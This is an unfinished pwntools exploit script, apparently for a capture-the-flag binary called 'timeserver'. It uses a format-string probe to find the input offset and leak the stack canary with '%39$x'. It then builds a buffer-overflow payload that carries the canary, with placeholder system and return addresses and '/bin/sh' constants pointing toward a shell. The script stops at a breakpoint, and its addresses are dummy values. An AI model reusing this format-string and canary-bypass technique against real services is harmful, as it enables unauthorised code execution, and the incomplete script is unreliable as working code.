import struct
from pwn import *

'''
AAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%
Invalid option: AAAA-80d90d1-80d90e4-804a29e-81101c0-a-ffa6d5d8-41414141

Offset for input: 7
Binary: 32 bit
'''

# Set pwntools debug level
context.log_level = 'debug'

SYSTEM_ADDR = 0x123
RET_ADDR = 0x123
BINSH1 = 0x2f6269
BINSH2 = 0x6e2f7368

g = cyclic_gen()

p = process('./timeserver')
p.recvlines(4)

# Leak the canary
p.sendline('%39$x')
result = p.recvlines(4)
canary = p32(int(result[0].decode().split(' ')[-1], 16))

# Payload
payload = b"A" * 128
payload += canary
payload += b'BBBBBBBB'

# Leak the offset
p.sendline(payload)
result = p.recvlines(4)


breakpoint()
